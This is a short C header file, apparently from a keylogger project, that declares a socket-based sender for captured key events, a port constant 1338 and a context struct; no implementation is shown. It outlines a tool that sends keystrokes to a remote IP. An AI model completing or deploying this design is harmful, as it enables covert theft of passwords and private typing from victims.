#ifndef __KEYLOGGER_PROCESSOR_H
#define __KEYLOGGER_PROCESSOR_H

#include <unistd.h>

#define KEYLOGGER_PORT 1338

struct keylogger_ctx {
    int keylogger_socket_fd;
};

int init_keylogger_sender_socket(const char *ip, int port);
int process_key_event(void *ctx, void *data, size_t data_sz);

#endif /* __KEYLOGGER_PROCESSOR_H */
